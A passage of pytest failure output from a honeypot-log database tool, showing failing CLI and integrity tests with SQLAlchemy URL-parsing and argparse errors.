    return fn(*args, **kwargs)  # type: ignore[no-any-return]
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/create.py:564: in create_engine
    u = _url.make_url(url)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/url.py:856: in make_url
    return _parse_url(name_or_url)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

name = '/tmp/tmpycyh5hfx.db'

    def _parse_url(name: str) -> URL:
        pattern = re.compile(
            r"""
                (?P<name>[\w\+]+)://
                (?:
                    (?P<username>[^:/]*)
                    (?::(?P<password>[^@]*))?
                @)?
                (?:
                    (?:
                        \[(?P<ipv6host>[^/\?]+)\] |
                        (?P<ipv4host>[^/:\?]+)
                    )?
                    (?::(?P<port>[^/\?]*))?
                )?
                (?:/(?P<database>[^\?]*))?
                (?:\?(?P<query>.*))?
                """,
            re.X,
        )
    
        m = pattern.match(name)
        if m is not None:
            components = m.groupdict()
            query: Optional[Dict[str, Union[str, List[str]]]]
            if components["query"] is not None:
                query = {}
    
                for key, value in parse_qsl(components["query"]):
                    if key in query:
                        query[key] = util.to_list(query[key])
                        cast("List[str]", query[key]).append(value)
                    else:
                        query[key] = value
            else:
                query = None
            components["query"] = query
    
            if components["username"] is not None:
                components["username"] = unquote(components["username"])
    
            if components["password"] is not None:
                components["password"] = unquote(components["password"])
    
            ipv4host = components.pop("ipv4host")
            ipv6host = components.pop("ipv6host")
            components["host"] = ipv4host or ipv6host
            name = components.pop("name")
    
            if components["port"]:
                components["port"] = int(components["port"])
    
            return URL.create(name, **components)  # type: ignore
    
        else:
>           raise exc.ArgumentError(
                "Could not parse SQLAlchemy URL from given URL string"
            )
E           sqlalchemy.exc.ArgumentError: Could not parse SQLAlchemy URL from given URL string

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/url.py:922: ArgumentError
_________________ TestCowrieDatabase.test_check_integrity_deep _________________

self = <test_cowrie_db_cli.TestCowrieDatabase object at 0x7756b437d550>
temp_db = PosixPath('/tmp/tmpyhu3gnff.db')

    def test_check_integrity_deep(self, temp_db) -> None:
        """Test deep integrity check."""
        db = CowrieDatabase(str(temp_db))
>       result = db.check_integrity(deep=True)

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_cli.py:164: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:520: in check_integrity
    with self._get_engine().connect() as conn:
/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:64: in _get_engine
    self._engine = create_engine_from_settings(settings)
/home/speterson/cowrieprocessor/cowrieprocessor/db/engine.py:120: in create_engine_from_settings
    engine = create_engine(url, connect_args=connect_args, **engine_kwargs)
<string>:2: in create_engine
    ???
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/util/deprecations.py:281: in warned
    return fn(*args, **kwargs)  # type: ignore[no-any-return]
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/create.py:564: in create_engine
    u = _url.make_url(url)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/url.py:856: in make_url
    return _parse_url(name_or_url)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

name = '/tmp/tmpyhu3gnff.db'

    def _parse_url(name: str) -> URL:
        pattern = re.compile(
            r"""
                (?P<name>[\w\+]+)://
                (?:
                    (?P<username>[^:/]*)
                    (?::(?P<password>[^@]*))?
                @)?
                (?:
                    (?:
                        \[(?P<ipv6host>[^/\?]+)\] |
                        (?P<ipv4host>[^/:\?]+)
                    )?
                    (?::(?P<port>[^/\?]*))?
                )?
                (?:/(?P<database>[^\?]*))?
                (?:\?(?P<query>.*))?
                """,
            re.X,
        )
    
        m = pattern.match(name)
        if m is not None:
            components = m.groupdict()
            query: Optional[Dict[str, Union[str, List[str]]]]
            if components["query"] is not None:
                query = {}
    
                for key, value in parse_qsl(components["query"]):
                    if key in query:
                        query[key] = util.to_list(query[key])
                        cast("List[str]", query[key]).append(value)
                    else:
                        query[key] = value
            else:
                query = None
            components["query"] = query
    
            if components["username"] is not None:
                components["username"] = unquote(components["username"])
    
            if components["password"] is not None:
                components["password"] = unquote(components["password"])
    
            ipv4host = components.pop("ipv4host")
            ipv6host = components.pop("ipv6host")
            components["host"] = ipv4host or ipv6host
            name = components.pop("name")
    
            if components["port"]:
                components["port"] = int(components["port"])
    
            return URL.create(name, **components)  # type: ignore
    
        else:
>           raise exc.ArgumentError(
                "Could not parse SQLAlchemy URL from given URL string"
            )
E           sqlalchemy.exc.ArgumentError: Could not parse SQLAlchemy URL from given URL string

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/url.py:922: ArgumentError
_________________ TestCowrieDatabase.test_optimize_vacuum_only _________________

self = <test_cowrie_db_cli.TestCowrieDatabase object at 0x7756b41c0140>
temp_db = PosixPath('/tmp/tmpbe2swobp.db')

    def test_optimize_vacuum_only(self, temp_db) -> None:
        """Test optimization with vacuum only."""
        db = CowrieDatabase(str(temp_db))
>       result = db.optimize(vacuum=True, reindex=False)

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_cli.py:173: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:321: in optimize
    with self._get_engine().connect() as conn:
/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:64: in _get_engine
    self._engine = create_engine_from_settings(settings)
/home/speterson/cowrieprocessor/cowrieprocessor/db/engine.py:120: in create_engine_from_settings
    engine = create_engine(url, connect_args=connect_args, **engine_kwargs)
<string>:2: in create_engine
    ???
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/util/deprecations.py:281: in warned
    return fn(*args, **kwargs)  # type: ignore[no-any-return]
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/create.py:564: in create_engine
    u = _url.make_url(url)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/url.py:856: in make_url
    return _parse_url(name_or_url)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

name = '/tmp/tmpbe2swobp.db'

    def _parse_url(name: str) -> URL:
        pattern = re.compile(
            r"""
                (?P<name>[\w\+]+)://
                (?:
                    (?P<username>[^:/]*)
                    (?::(?P<password>[^@]*))?
                @)?
                (?:
                    (?:
                        \[(?P<ipv6host>[^/\?]+)\] |
                        (?P<ipv4host>[^/:\?]+)
                    )?
                    (?::(?P<port>[^/\?]*))?
                )?
                (?:/(?P<database>[^\?]*))?
                (?:\?(?P<query>.*))?
                """,
            re.X,
        )
    
        m = pattern.match(name)
        if m is not None:
            components = m.groupdict()
            query: Optional[Dict[str, Union[str, List[str]]]]
            if components["query"] is not None:
                query = {}
    
                for key, value in parse_qsl(components["query"]):
                    if key in query:
                        query[key] = util.to_list(query[key])
                        cast("List[str]", query[key]).append(value)
                    else:
                        query[key] = value
            else:
                query = None
            components["query"] = query
    
            if components["username"] is not None:
                components["username"] = unquote(components["username"])
    
            if components["password"] is not None:
                components["password"] = unquote(components["password"])
    
            ipv4host = components.pop("ipv4host")
            ipv6host = components.pop("ipv6host")
            components["host"] = ipv4host or ipv6host
            name = components.pop("name")
    
            if components["port"]:
                components["port"] = int(components["port"])
    
            return URL.create(name, **components)  # type: ignore
    
        else:
>           raise exc.ArgumentError(
                "Could not parse SQLAlchemy URL from given URL string"
            )
E           sqlalchemy.exc.ArgumentError: Could not parse SQLAlchemy URL from given URL string

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/url.py:922: ArgumentError
________________ TestCowrieDatabase.test_optimize_reindex_only _________________

self = <test_cowrie_db_cli.TestCowrieDatabase object at 0x7756b41c0230>
temp_db = PosixPath('/tmp/tmphg0lhkl7.db')

    def test_optimize_reindex_only(self, temp_db) -> None:
        """Test optimization with reindex only."""
        db = CowrieDatabase(str(temp_db))
>       result = db.optimize(vacuum=False, reindex=True)

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_cli.py:184: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:321: in optimize
    with self._get_engine().connect() as conn:
/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:64: in _get_engine
    self._engine = create_engine_from_settings(settings)
/home/speterson/cowrieprocessor/cowrieprocessor/db/engine.py:120: in create_engine_from_settings
    engine = create_engine(url, connect_args=connect_args, **engine_kwargs)
<string>:2: in create_engine
    ???
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/util/deprecations.py:281: in warned
    return fn(*args, **kwargs)  # type: ignore[no-any-return]
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/create.py:564: in create_engine
    u = _url.make_url(url)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/url.py:856: in make_url
    return _parse_url(name_or_url)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

name = '/tmp/tmphg0lhkl7.db'

    def _parse_url(name: str) -> URL:
        pattern = re.compile(
            r"""
                (?P<name>[\w\+]+)://
                (?:
                    (?P<username>[^:/]*)
                    (?::(?P<password>[^@]*))?
                @)?
                (?:
                    (?:
                        \[(?P<ipv6host>[^/\?]+)\] |
                        (?P<ipv4host>[^/:\?]+)
                    )?
                    (?::(?P<port>[^/\?]*))?
                )?
                (?:/(?P<database>[^\?]*))?
                (?:\?(?P<query>.*))?
                """,
            re.X,
        )
    
        m = pattern.match(name)
        if m is not None:
            components = m.groupdict()
            query: Optional[Dict[str, Union[str, List[str]]]]
            if components["query"] is not None:
                query = {}
    
                for key, value in parse_qsl(components["query"]):
                    if key in query:
                        query[key] = util.to_list(query[key])
                        cast("List[str]", query[key]).append(value)
                    else:
                        query[key] = value
            else:
                query = None
            components["query"] = query
    
            if components["username"] is not None:
                components["username"] = unquote(components["username"])
    
            if components["password"] is not None:
                components["password"] = unquote(components["password"])
    
            ipv4host = components.pop("ipv4host")
            ipv6host = components.pop("ipv6host")
            components["host"] = ipv4host or ipv6host
            name = components.pop("name")
    
            if components["port"]:
                components["port"] = int(components["port"])
    
            return URL.create(name, **components)  # type: ignore
    
        else:
>           raise exc.ArgumentError(
                "Could not parse SQLAlchemy URL from given URL string"
            )
E           sqlalchemy.exc.ArgumentError: Could not parse SQLAlchemy URL from given URL string

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/url.py:922: ArgumentError
__________________ TestCowrieDatabaseCLI.test_migrate_command __________________

self = ArgumentParser(prog='cowrie-db', usage=None, description='Cowrie database management utilities', formatter_class=<class 'argparse.RawDescriptionHelpFormatter'>, conflict_handler='error', add_help=True)
args = ['--db-path', '/tmp/tmpblo01srq.db', 'migrate']
namespace = Namespace(db_url=None, command=None), intermixed = False

    def _parse_known_args2(self, args, namespace, intermixed):
        if args is None:
            # args default to the system args
            args = _sys.argv[1:]
        else:
            # make sure that args are mutable
            args = list(args)
    
        # default Namespace built from parser defaults
        if namespace is None:
            namespace = Namespace()
    
        # add any action defaults that aren't present
        for action in self._actions:
            if action.dest is not SUPPRESS:
                if not hasattr(namespace, action.dest):
                    if action.default is not SUPPRESS:
                        setattr(namespace, action.dest, action.default)
    
        # add any parser defaults that aren't present
        for dest in self._defaults:
            if not hasattr(namespace, dest):
                setattr(namespace, dest, self._defaults[dest])
    
        # parse the arguments and exit if there are any errors
        if self.exit_on_error:
            try:
>               namespace, args = self._parse_known_args(args, namespace, intermixed)

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1937: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2192: in _parse_known_args
    stop_index = consume_positionals(start_index)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2144: in consume_positionals
    take_action(action, args)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1998: in take_action
    argument_values = self._get_values(action, argument_strings)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2528: in _get_values
    self._check_value(action, value[0])
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = ArgumentParser(prog='cowrie-db', usage=None, description='Cowrie database management utilities', formatter_class=<class 'argparse.RawDescriptionHelpFormatter'>, conflict_handler='error', add_help=True)
action = _SubParsersAction(option_strings=[], dest='command', nargs='A...', const=None, default=None, type=None, choices={'migr..., conflict_handler='error', add_help=True)}, required=False, help='Available commands', metavar=None, deprecated=False)
value = '/tmp/tmpblo01srq.db'

    def _check_value(self, action, value):
        # converted value must be one of the choices (if specified)
        choices = action.choices
        if choices is not None:
            if isinstance(choices, str):
                choices = iter(choices)
            if value not in choices:
                args = {'value': str(value),
                        'choices': ', '.join(map(str, action.choices))}
                msg = _('invalid choice: %(value)r (choose from %(choices)s)')
>               raise ArgumentError(action, msg % args)
E               argparse.ArgumentError: argument command: invalid choice: '/tmp/tmpblo01srq.db' (choose from migrate, check, optimize, backup, integrity, backfill, sanitize, organize, files, analyze, repair, longtail-migrate, longtail-rollback, longtail-validate, info, migrate-to-postgres)

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2578: ArgumentError

During handling of the above exception, another exception occurred:

self = <test_cowrie_db_cli.TestCowrieDatabaseCLI object at 0x7756b439f4d0>
mock_db_class = <MagicMock name='CowrieDatabase' id='131213176610096'>
temp_db = '/tmp/tmpblo01srq.db'
capsys = <_pytest.capture.CaptureFixture object at 0x7756b336fb60>

    @patch('cowrieprocessor.cli.cowrie_db.CowrieDatabase')
    def test_migrate_command(self, mock_db_class, temp_db, capsys) -> None:
        """Test migrate command."""
        # Mock the database
        mock_db = Mock()
        mock_db.migrate.return_value = {
            'current_version': 2,
            'target_version': 2,
            'final_version': 2,
            'message': 'Database already at version 2',
        }
        mock_db_class.return_value = mock_db
    
        # Import and run main function with mocked args
        from unittest.mock import patch
    
        from cowrieprocessor.cli.cowrie_db import main
    
        with patch('sys.argv', ['cowrie-db', '--db-path', temp_db, 'migrate']):
>           main()

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_cli.py:236: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:2446: in main
    args = parser.parse_args()
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1898: in parse_args
    args, argv = self.parse_known_args(args, namespace)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1908: in parse_known_args
    return self._parse_known_args2(args, namespace, intermixed=False)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1939: in _parse_known_args2
    self.error(str(err))
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2658: in error
    self.exit(2, _('%(prog)s: error: %(message)s\n') % args)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = ArgumentParser(prog='cowrie-db', usage=None, description='Cowrie database management utilities', formatter_class=<class 'argparse.RawDescriptionHelpFormatter'>, conflict_handler='error', add_help=True)
status = 2
message = "cowrie-db: error: argument command: invalid choice: '/tmp/tmpblo01srq.db' (choose from migrate, check, optimize, back...organize, files, analyze, repair, longtail-migrate, longtail-rollback, longtail-validate, info, migrate-to-postgres)\n"

    def exit(self, status=0, message=None):
        if message:
            self._print_message(message, _sys.stderr)
>       _sys.exit(status)
E       SystemExit: 2

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2645: SystemExit
----------------------------- Captured stderr call -----------------------------
usage: cowrie-db [-h] [--db-url DB_URL]
                 {migrate,check,optimize,backup,integrity,backfill,sanitize,organize,files,analyze,repair,longtail-migrate,longtail-rollback,longtail-validate,info,migrate-to-postgres} ...
cowrie-db: error: argument command: invalid choice: '/tmp/tmpblo01srq.db' (choose from migrate, check, optimize, backup, integrity, backfill, sanitize, organize, files, analyze, repair, longtail-migrate, longtail-rollback, longtail-validate, info, migrate-to-postgres)
___________________ TestCowrieDatabaseCLI.test_check_command ___________________

self = <test_cowrie_db_cli.TestCowrieDatabaseCLI object at 0x7756b439f610>
mock_db_class = <MagicMock name='CowrieDatabase' id='131213176612448'>
temp_db = '/tmp/tmpjghkm83n.db'
capsys = <_pytest.capture.CaptureFixture object at 0x7756b2760e10>

    @patch('cowrieprocessor.cli.cowrie_db.CowrieDatabase')
    def test_check_command(self, mock_db_class, temp_db, capsys) -> None:
        """Test check command."""
        # Mock the database
        mock_db = Mock()
        mock_db.validate_schema.return_value = {
            'is_valid': True,
            'schema_version': 2,
            'expected_version': 2,
            'database_size_mb': 10.5,
            'session_count': 100,
            'command_count': 500,
            'file_count': 25,
            'needs_optimization': False,
        }
        mock_db_class.return_value = mock_db
    
        # Import and run main function with mocked args
        from unittest.mock import patch
    
        from cowrieprocessor.cli.cowrie_db import main
    
        with patch('sys.argv', ['cowrie-db', '--db-path', temp_db, 'check', '--verbose']):
            with pytest.raises(SystemExit) as exc_info:
                main()
    
>       assert exc_info.value.code == 0
E       assert 2 == 0
E        +  where 2 = SystemExit(2).code
E        +    where SystemExit(2) = <ExceptionInfo SystemExit(2) tblen=7>.value

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_cli.py:267: AssertionError
----------------------------- Captured stderr call -----------------------------
usage: cowrie-db [-h] [--db-url DB_URL]
                 {migrate,check,optimize,backup,integrity,backfill,sanitize,organize,files,analyze,repair,longtail-migrate,longtail-rollback,longtail-validate,info,migrate-to-postgres} ...
cowrie-db: error: argument command: invalid choice: '/tmp/tmpjghkm83n.db' (choose from migrate, check, optimize, backup, integrity, backfill, sanitize, organize, files, analyze, repair, longtail-migrate, longtail-rollback, longtail-validate, info, migrate-to-postgres)
__________________ TestCowrieDatabaseCLI.test_backup_command ___________________

self = ArgumentParser(prog='cowrie-db', usage=None, description='Cowrie database management utilities', formatter_class=<class 'argparse.RawDescriptionHelpFormatter'>, conflict_handler='error', add_help=True)
args = ['--db-path', '/tmp/tmpjt_3r5tt.db', 'backup']
namespace = Namespace(db_url=None, command=None), intermixed = False

    def _parse_known_args2(self, args, namespace, intermixed):
        if args is None:
            # args default to the system args
            args = _sys.argv[1:]
        else:
            # make sure that args are mutable
            args = list(args)
    
        # default Namespace built from parser defaults
        if namespace is None:
            namespace = Namespace()
    
        # add any action defaults that aren't present
        for action in self._actions:
            if action.dest is not SUPPRESS:
                if not hasattr(namespace, action.dest):
                    if action.default is not SUPPRESS:
                        setattr(namespace, action.dest, action.default)
    
        # add any parser defaults that aren't present
        for dest in self._defaults:
            if not hasattr(namespace, dest):
                setattr(namespace, dest, self._defaults[dest])
    
        # parse the arguments and exit if there are any errors
        if self.exit_on_error:
            try:
>               namespace, args = self._parse_known_args(args, namespace, intermixed)

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1937: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2192: in _parse_known_args
    stop_index = consume_positionals(start_index)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2144: in consume_positionals
    take_action(action, args)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1998: in take_action
    argument_values = self._get_values(action, argument_strings)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2528: in _get_values
    self._check_value(action, value[0])
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = ArgumentParser(prog='cowrie-db', usage=None, description='Cowrie database management utilities', formatter_class=<class 'argparse.RawDescriptionHelpFormatter'>, conflict_handler='error', add_help=True)
action = _SubParsersAction(option_strings=[], dest='command', nargs='A...', const=None, default=None, type=None, choices={'migr..., conflict_handler='error', add_help=True)}, required=False, help='Available commands', metavar=None, deprecated=False)
value = '/tmp/tmpjt_3r5tt.db'

    def _check_value(self, action, value):
        # converted value must be one of the choices (if specified)
        choices = action.choices
        if choices is not None:
            if isinstance(choices, str):
                choices = iter(choices)
            if value not in choices:
                args = {'value': str(value),
                        'choices': ', '.join(map(str, action.choices))}
                msg = _('invalid choice: %(value)r (choose from %(choices)s)')
>               raise ArgumentError(action, msg % args)
E               argparse.ArgumentError: argument command: invalid choice: '/tmp/tmpjt_3r5tt.db' (choose from migrate, check, optimize, backup, integrity, backfill, sanitize, organize, files, analyze, repair, longtail-migrate, longtail-rollback, longtail-validate, info, migrate-to-postgres)

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2578: ArgumentError

During handling of the above exception, another exception occurred:

self = <test_cowrie_db_cli.TestCowrieDatabaseCLI object at 0x7756b430cc30>
mock_db_class = <MagicMock name='CowrieDatabase' id='131213176612784'>
temp_db = '/tmp/tmpjt_3r5tt.db'
capsys = <_pytest.capture.CaptureFixture object at 0x7756b28fe490>

    @patch('cowrieprocessor.cli.cowrie_db.CowrieDatabase')
    def test_backup_command(self, mock_db_class, temp_db, capsys) -> None:
        """Test backup command."""
        # Mock the database
        mock_db = Mock()
        mock_db.create_backup.return_value = '/path/to/backup_20250101_120000.sqlite'
        mock_db_class.return_value = mock_db
    
        # Import and run main function with mocked args
        from unittest.mock import patch
    
        from cowrieprocessor.cli.cowrie_db import main
    
        with patch('sys.argv', ['cowrie-db', '--db-path', temp_db, 'backup']):
>           main()

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_cli.py:287: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:2446: in main
    args = parser.parse_args()
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1898: in parse_args
    args, argv = self.parse_known_args(args, namespace)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1908: in parse_known_args
    return self._parse_known_args2(args, namespace, intermixed=False)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1939: in _parse_known_args2
    self.error(str(err))
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2658: in error
    self.exit(2, _('%(prog)s: error: %(message)s\n') % args)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = ArgumentParser(prog='cowrie-db', usage=None, description='Cowrie database management utilities', formatter_class=<class 'argparse.RawDescriptionHelpFormatter'>, conflict_handler='error', add_help=True)
status = 2
message = "cowrie-db: error: argument command: invalid choice: '/tmp/tmpjt_3r5tt.db' (choose from migrate, check, optimize, back...organize, files, analyze, repair, longtail-migrate, longtail-rollback, longtail-validate, info, migrate-to-postgres)\n"

    def exit(self, status=0, message=None):
        if message:
            self._print_message(message, _sys.stderr)
>       _sys.exit(status)
E       SystemExit: 2

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2645: SystemExit
----------------------------- Captured stderr call -----------------------------
usage: cowrie-db [-h] [--db-url DB_URL]
                 {migrate,check,optimize,backup,integrity,backfill,sanitize,organize,files,analyze,repair,longtail-migrate,longtail-rollback,longtail-validate,info,migrate-to-postgres} ...
cowrie-db: error: argument command: invalid choice: '/tmp/tmpjt_3r5tt.db' (choose from migrate, check, optimize, backup, integrity, backfill, sanitize, organize, files, analyze, repair, longtail-migrate, longtail-rollback, longtail-validate, info, migrate-to-postgres)
_________________ TestCowrieDatabaseCLI.test_integrity_command _________________

self = ArgumentParser(prog='cowrie-db', usage=None, description='Cowrie database management utilities', formatter_class=<class 'argparse.RawDescriptionHelpFormatter'>, conflict_handler='error', add_help=True)
args = ['--db-path', '/tmp/tmppzwj3r0r.db', 'integrity']
namespace = Namespace(db_url=None, command=None), intermixed = False

    def _parse_known_args2(self, args, namespace, intermixed):
        if args is None:
            # args default to the system args
            args = _sys.argv[1:]
        else:
            # make sure that args are mutable
            args = list(args)
    
        # default Namespace built from parser defaults
        if namespace is None:
            namespace = Namespace()
    
        # add any action defaults that aren't present
        for action in self._actions:
            if action.dest is not SUPPRESS:
                if not hasattr(namespace, action.dest):
                    if action.default is not SUPPRESS:
                        setattr(namespace, action.dest, action.default)
    
        # add any parser defaults that aren't present
        for dest in self._defaults:
            if not hasattr(namespace, dest):
                setattr(namespace, dest, self._defaults[dest])
    
        # parse the arguments and exit if there are any errors
        if self.exit_on_error:
            try:
>               namespace, args = self._parse_known_args(args, namespace, intermixed)

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1937: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2192: in _parse_known_args
    stop_index = consume_positionals(start_index)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2144: in consume_positionals
    take_action(action, args)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1998: in take_action
    argument_values = self._get_values(action, argument_strings)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2528: in _get_values
    self._check_value(action, value[0])
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = ArgumentParser(prog='cowrie-db', usage=None, description='Cowrie database management utilities', formatter_class=<class 'argparse.RawDescriptionHelpFormatter'>, conflict_handler='error', add_help=True)
action = _SubParsersAction(option_strings=[], dest='command', nargs='A...', const=None, default=None, type=None, choices={'migr..., conflict_handler='error', add_help=True)}, required=False, help='Available commands', metavar=None, deprecated=False)
value = '/tmp/tmppzwj3r0r.db'

    def _check_value(self, action, value):
        # converted value must be one of the choices (if specified)
        choices = action.choices
        if choices is not None:
            if isinstance(choices, str):
                choices = iter(choices)
            if value not in choices:
                args = {'value': str(value),
                        'choices': ', '.join(map(str, action.choices))}
                msg = _('invalid choice: %(value)r (choose from %(choices)s)')
>               raise ArgumentError(action, msg % args)
E               argparse.ArgumentError: argument command: invalid choice: '/tmp/tmppzwj3r0r.db' (choose from migrate, check, optimize, backup, integrity, backfill, sanitize, organize, files, analyze, repair, longtail-migrate, longtail-rollback, longtail-validate, info, migrate-to-postgres)

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2578: ArgumentError

During handling of the above exception, another exception occurred:

self = <test_cowrie_db_cli.TestCowrieDatabaseCLI object at 0x7756b430cd60>
mock_db_class = <MagicMock name='CowrieDatabase' id='131213176615472'>
temp_db = '/tmp/tmppzwj3r0r.db'
capsys = <_pytest.capture.CaptureFixture object at 0x7756b34e5940>

    @patch('cowrieprocessor.cli.cowrie_db.CowrieDatabase')
    def test_integrity_command(self, mock_db_class, temp_db, capsys) -> None:
        """Test integrity command."""
        # Mock the database
        mock_db = Mock()
        mock_db.check_integrity.return_value = {
            'corruption_found': False,
            'checks': {
                'quick_check': {'is_valid': True, 'error': None},
                'foreign_keys': {'is_valid': True, 'error': None},
                'indexes': {'is_valid': True, 'error': None},
            },
            'recommendations': [],
        }
